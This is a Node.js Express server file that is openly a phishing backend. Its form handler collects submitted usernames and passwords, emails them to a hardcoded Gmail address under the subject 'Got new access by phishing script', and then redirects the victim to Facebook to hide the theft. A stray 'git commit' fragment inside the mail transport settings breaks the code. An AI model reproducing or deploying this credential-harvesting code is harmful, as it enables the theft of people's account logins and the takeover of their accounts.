const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));

// Parse JSON bodies (as sent by API clients)
app.use(bodyParser.json());

// Handle form submission
app.post('/submit-form', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    const transporter = nodemailer.createTransport({
        service: 'gmail',git commit
        auth: {
            user: 'your-email@gmail.com', // Your Gmail email address
            pass: 'your-password' // Your Gmail password (not recommended for production)
        }
    });

    const mailOptions = {
        from: 'rajivary1@gmail.com',
        to: 'aryalrajiv1@gmail.com', // Recipient's email address
        subject: 'Got new access by phishing script',
        text: `The username is ${username} and password is ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            res.status(500).send('Failed to send email');
        } else {
            console.log('Email sent: ' + info.response);
            res.redirect('http://www.facebook.com');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
